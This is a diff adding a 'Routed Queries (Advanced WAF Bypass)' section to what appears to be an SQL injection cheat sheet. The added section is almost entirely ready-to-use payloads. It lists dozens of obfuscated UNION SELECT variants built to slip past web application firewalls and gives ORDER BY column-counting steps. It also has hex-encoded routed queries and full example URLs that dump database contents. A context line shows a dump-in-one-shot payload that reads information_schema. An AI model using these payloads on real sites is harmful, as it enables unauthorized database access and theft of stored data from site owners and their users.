@@ -301,6 +301,187 @@ This one is the easiest of all SQLi attacks.
 > (/*!%53ELECT*/(@x)FROM(/*!%53ELECT*/(@x:=0x00),(@NR:=0),(/*!%53ELECT*/(0)/*!%46ROM*/(/*!%49NFORMATION_%53CHEMA*/./*!%54ABLES*/)/*!%57HERE*/(/*!%54ABLE_%53CHEMA*//**/NOT/**/LIKE/**/0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=/*!CONCAT%0a(*/@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,/*!%74able_%6eame*/,0x3c62723e))))x)
 > ```
 
+
+---
+
+## Routed Queries (Advanced WAF Bypass)
+
+> - If the WAF is difficult to bypass using above queries, the routed one's might work for us.
+
+- Identifying which column is vulnerable to be dumped.
+> ```sql
+> https://www.example.com/index.php?id=-1 UNION SELECT 0x3127, 2, 3, 4
+> https://www.example.com/index.php?id=-1 UNION SELECT 1, 0x3227, 3, 4
+> https://www.example.com/index.php?id=-1 UNION SELECT 1, 2, 0x3327, 4
+> https://www.example.com/index.php?id=-1 UNION SELECT 1, 2, 3, 0x3427
+> ```
+> - Where:
+>   - Tip: https://onlinehextools.com/convert-hex-to-ascii
+> ```
+> 0xHEX to ASCII Conversions:
+> 0x3127 == 1'
+> 0x3227 == 2'
+> 0x3327 == 3'
+> 0x3427 == 4'
+> ```
+> - If any of the payload gives error, it means that the respective column is vulnerable to be dumped.
+
+> - WAF Bypasses (Just Replace Union Select with these ones):
+> ```sql
+> /*!50000%55nIoN*/ /*!50000%53eLeCt*/  
+> %55nion(%53elect 1,2,3)  
+> union+distinctROW+select+1,2,3,4-- -  
+> #?uNiOn + #?sEleCt  
+> #?1q %0AuNiOn all#qa%0A#%0AsEleCt  
+> /*!%55NiOn*/ /*!%53eLEct*/  
+> +un/**/ion+se/**/lect  
+> +?UnI?On?+'SeL?ECT?  
+> (UnIoN)+(SelECT)+1,2,3,4-- -  
+> +UnIoN/*&a=*/SeLeCT/*&a=*/  
+> %55nion(%53elect 1,2,3,4)-- -  
+> /**//*!12345UNION SELECT*//**/  
+> /**//*!50000UNION SELECT*//**/  
+> /**/UNION/**//*!50000SELECT*//**/  
+> /*!50000UniON SeLeCt*/  
+> union /*!50000%53elect*/  
+> /*!u%6eion*/ /*!se%6cect*/  
+> /*--*/union/*--*/select/*--*/  
+> union (/*!/**/ SeleCT */ 1,2,3,4)-- -  
+> /*!union*/+/*!select*/  
+> /**/uNIon/**/sEleCt/**/  
+> +%2F**/+Union/*!select*/  
+> /**//*!union*//**//*!select*//**/  
+> /*!uNIOn*/ /*!SelECt*/  
+> /**/union/*!50000select*//**/  
+> 0%a0union%a0select%09  
+> %0Aunion%0Aselect%0A  
+> uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/  
+> %252f%252a*/UNION%252f%252a /SELECT%252f%252a*/  
+> /*!union*//*--*//*!all*//*--*//*!select*/  
+> union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
+> /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/  
+> +UnIoN/*&a=*/SeLeCT/*&a=*/  
+> union+sel%0bect  
+> +#1q%0Aunion all#qa%0A#%0Aselect  
+> %23xyz%0AUnIOn%23xyz%0ASeLecT+  
+> %23xyz%0A%55nIOn%23xyz%0A%53eLecT+  
+> union(select(1),2,3)
+> uNioN (/*!/**/ SeleCT */ 11)  
+> /**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/  
+> %0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/  
+> +union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C  
+> /*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/  
+> +UnIoN/*&a=*/SeLeCT/*&a=*/  
+> +/*!UnIoN*/+/*!SeLeCt*/+  
+> /*!u%6eion*/ /*!se%6cect*/  
+> uni%20union%20/*!select*/%20  
+> union%23aa%0Aselect  
+> /**/union/*!50000select*/  
+> /^****union.*$/ /^****select.*$/  
+> /*union*/union/*select*/select+  
+> /*!50000UnION*//*!50000SeLeCt*/  
+> %252f%252a*/union%252f%252a /select%252f%252a*/  
+> ```
+> - Final payload will look something like this:
+> ```sql
+> https://www.example.com/index.php?id=-1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1, 0x3227, 3, 4
+> ```
+
+- Finding the total number of columns using (ORDER BY) after finding the vulnerable column that can give us information:
+> - Building Payload:
+> - Starting with the basic syntax of queries:
+> ```sql
+> and 0e0union distinctROW select 1,2,3,4  
+> and .0unIon distinctrOw /*!50000sElect*/ 1,2,3,4  
+> AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4  
+> and mod(9,9) UNION SELECT 1,2,3,4  
+> '-,1union distinctrow%23aaaaaaaaaaaaaaa%0a select 1,2,3,4  
+> .0union distinct/**_**/Select 1,2,3,4  
+> union distinct selec%54 1,2,3,4  
+> UniOn DISTINCTROW sEleCt 1,2,3,4  
+> union distinct select 1,2,3,4  
+> union distinctROW select 1,2,3,4  
+> ```
+> - So the final query will look like:
+> ```sql
+> https://www.example.com/index.php?id=-1 AnD point(29, 9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4
+> ```
+> - Suppose second column was vulnerable for the data to be dumped.
+> - We'll now replace it with `0x32204f524445522042592031`
+>   - where `0x32204f524445522042592031` == `2 ORDER BY 1` (0xHEX converted)
+> ```sql
+> https://www.example.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,0x32204f524445522042592031,3,4
+> ```
+> - In `2 ORDER by 1`, 2 coz 2nd table is vulnerable and 1 is ordering by column position
+>   - Reference: https://stackoverflow.com/questions/11368871/mysql-can-we-order-by-column-position-instead-of-name
+> - The payload must not show errors until we increase the number more than the number of columns
+> - For example:
+> ```sql
+> 2 ORDER BY 1 -> 0x32204f524445522042592031  
+> 2 ORDER BY 2 -> 0x32204f524445522042592032  
+> 2 ORDER BY 3 -> 0x32204f524445522042592033  
+> 2 ORDER BY 4 -> 0x32204f524445522042592034  
+> 2 ORDER BY 5 -> 0x32204f524445522042592035  
+> 2 ORDER BY 6 -> 0x32204f524445522042592036  
+> 2 ORDER BY 7 -> 0x32204f524445522042592037  
+> 2 ORDER BY 8 -> 0x32204f524445522042592038  
+> and so on... (until you get error)
+> ```
+> - Suppose we got error on `2 ORDER BY 8`, that means the table has 7 columns.
+
+- Finding the vulnerable column (again) to be able to dump data that we need (can be used as an alternative to above `Identifying which column is vulnerable to be dumped.`):
+> - Now, from the previous example we know that there are 7 columns
+> - Adjusting our payload to select 7 columns.
+> ```sql
+> 2 and 0e0union distinctROW select 1,2,3,4,5,6,7
+> 2 and .0unIon distincrOw /!50000sElect/ 1,2,3,4,5,6,7
+> 2 AnD point(29,9) /!50000UnION/ /!50000SelEcT/ 1,2,3,4,5,6,7
+> 2 '-,1union distinctrow%23aaaaaaaaaaaaaaa%0a select 1,2,3,4,5,6,7
+> 2 .0union distinct/**_**/Select 1,2,3,4,5,6,7
+> 2 union distinct selec%54 1,2,3,4,5,6,7
+> 2 UniOn DISTINCTROW sEleCt 1,2,3,4,5,6,7
+> 2+union+distinct+select+1,2,3,4,5,6,7
+> 2+union+distinctROW+select+1,2,3,4,5,6,7
+> ```
+> - We will have to convert these queires to 0xHEX
+> ```HEX
+> 0x3720616e6420306530756e696f6e2064697374696e6374524f572073656c65637420312c322c332c342c352c362c37
+> 0x3720616e64202e30756e496f6e2064697374696e63724f77202f2a21353030303073456c6563742a2f20312c322c332c342c352c362c37
+> 0x3720416e4420706f696e742832392c3929202f2a213530303030556e494f4e2a2f202f2a21353030303053656c4563542a2f20312c322c332c342c352c362c37
+> 0x3720272d2c31756e696f6e2064697374696e6374726f772532336161616161616161616161616161612530612073656c65637420312c322c332c342c352c362c37
+> 0x37202e30756e696f6e2064697374696e63742f2a2a5f2a2a2f53656c65637420312c322c332c342c352c362c37
+> 0xa3720756e696f6e2064697374696e63742073656c656325353420312c322c332c342c352c362c37
+> 0x3720556e694f6e2044495354494e4354524f572073456c65437420312c322c332c342c352c362c37
+> 0x372b756e696f6e2b64697374696e63742b73656c6563742b312c322c332c342c352c362c37
+> 0x372b756e696f6e2b64697374696e6374524f572b73656c6563742b312c322c332c342c352c362c37
+> ```
+> - Modifying our payload:
+> ```sql
+> https://www.example.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,0x3720416e4420706f696e742832392c3929202f2a213530303030556e494f4e2a2f202f2a21353030303053656c4563542a2f20312c322c332c342c352c362c37,3,4
+> ```
+> - Modifying the query according to our needs will give us our vulnerable column number. Suppose, let it be column no. 6 for our next scenario
+
+- Dumping the data using vulnerable column
+> - Our payload was:
+> ```sql
+> 1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4,5,6,7
+> ```
+> - Suppose column no. 6 was vulnerable, we simply need to replace it with the 0xHEX Conversion of concat(), DIOS or any other payload according to our need.
+> - For example:
+> ```sql
+> 1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4,5,database(),7
+> ```
+> - Convert it to 0xHEX and paste it in the next payload
+> ```sql
+> https://www.example.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,0x3720416e4420706f696e742832392c3929202f2a213530303030556e494f4e2a2f202f2a21353030303053656c4563542a2f20312c322c332c342c352c646174616261736528292c37,3,4
+> ```
+> OR
+> ```sql
+> http://domain.com/index.php?id=-1 AnD point(29,9) /*!50000UnION*/ /*!50000SelEcT*/ 1,2,3,4,5, 0x64617461626173652829, 7
+> ```
+> - where
+>   - `0x64617461626173652829 == database()`
+
 ---
 
 > Hence we are done dumping all the data we need and want.
